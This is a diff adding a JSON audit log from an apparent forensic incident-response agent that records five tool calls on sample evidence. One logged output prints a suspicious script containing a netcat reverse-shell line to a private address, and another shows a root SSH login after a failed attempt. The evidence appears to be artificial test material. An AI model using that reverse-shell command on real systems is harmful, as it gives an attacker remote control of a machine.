@@ -1,0 +1,74 @@
+{
+  "audit_chain_version": "1.0",
+  "agent": "NEXUS-IR",
+  "generated": "2026-05-27T21:04:48.012730",
+  "total_entries": 5,
+  "chain_integrity": "VERIFIED",
+  "entries": [
+    {
+      "finding_id": "FID-9CA3E9AE",
+      "call_id": "FID-B0D2A899",
+      "timestamp": "2026-05-27T21:04:47.992775",
+      "tool": "md5sum",
+      "command": "md5sum ~/findevil/evidence/test_evidence.dd",
+      "evidence_path": "~/findevil/evidence/test_evidence.dd",
+      "output_preview": "d41d8cd98f00b204e9800998ecf8427e  /home/macbere/findevil/evidence/test_evidence.dd",
+      "output_hash_md5": "5c0609fbf45050e3c6ba8b1ad9e5064e",
+      "exit_code": 0,
+      "traceable": true,
+      "chain_of_custody": "INTACT"
+    },
+    {
+      "finding_id": "FID-884B5BC8",
+      "call_id": "FID-F67BF4AF",
+      "timestamp": "2026-05-27T21:04:47.997091",
+      "tool": "grep_ioc",
+      "command": "grep -c '192.168' ~/findevil/evidence/sample/ioc_list.txt",
+      "evidence_path": "~/findevil/evidence/sample/ioc_list.txt",
+      "output_preview": "1",
+      "output_hash_md5": "c4ca4238a0b923820dcc509a6f75849b",
+      "exit_code": 0,
+      "traceable": true,
+      "chain_of_custody": "INTACT"
+    },
+    {
+      "finding_id": "FID-A2AB6FBF",
+      "call_id": "FID-460E568B",
+      "timestamp": "2026-05-27T21:04:48.000488",
+      "tool": "cat_suspicious",
+      "command": "cat ~/findevil/evidence/sample/suspicious.sh",
+      "evidence_path": "~/findevil/evidence/sample/suspicious.sh",
+      "output_preview": "#!/bin/bash\n# Suspicious script found in /tmp\nnc -e /bin/bash 192.168.1.100 4444",
+      "output_hash_md5": "4787e0fce8758338a4705220e47ec720",
+      "exit_code": 0,
+      "traceable": true,
+      "chain_of_custody": "INTACT"
+    },
+    {
+      "finding_id": "FID-070C9C23",
+      "call_id": "FID-E85F06DE",
+      "timestamp": "2026-05-27T21:04:48.004145",
+      "tool": "auth_log_parser",
+      "command": "cat ~/findevil/evidence/sample/cleared_logs.txt",
+      "evidence_path": "~/findevil/evidence/sample/cleared_logs.txt",
+      "output_preview": "May 26 03:14 sshd: Failed password for root from 10.0.0.5\nMay 26 03:15 sshd: Accepted password for root from 10.0.0.5",
+      "output_hash_md5": "eb74a03d150b45772420b095e7984de4",
+      "exit_code": 0,
+      "traceable": true,
+      "chain_of_custody": "INTACT"
+    },
+    {
+      "finding_id": "FID-4D13B7B3",
+      "call_id": "FID-4494C2D7",
+      "timestamp": "2026-05-27T21:04:48.007916",
+      "tool": "file_enum",
+      "command": "find ~/findevil/evidence -type f | wc -l",
+      "evidence_path": "~/findevil/evidence",
+      "output_preview": "5",
+      "output_hash_md5": "e4da3b7fbbce2345d7772b0674a318d5",
+      "exit_code": 0,
+      "traceable": true,
+      "chain_of_custody": "INTACT"
+    }
+  ]
+}
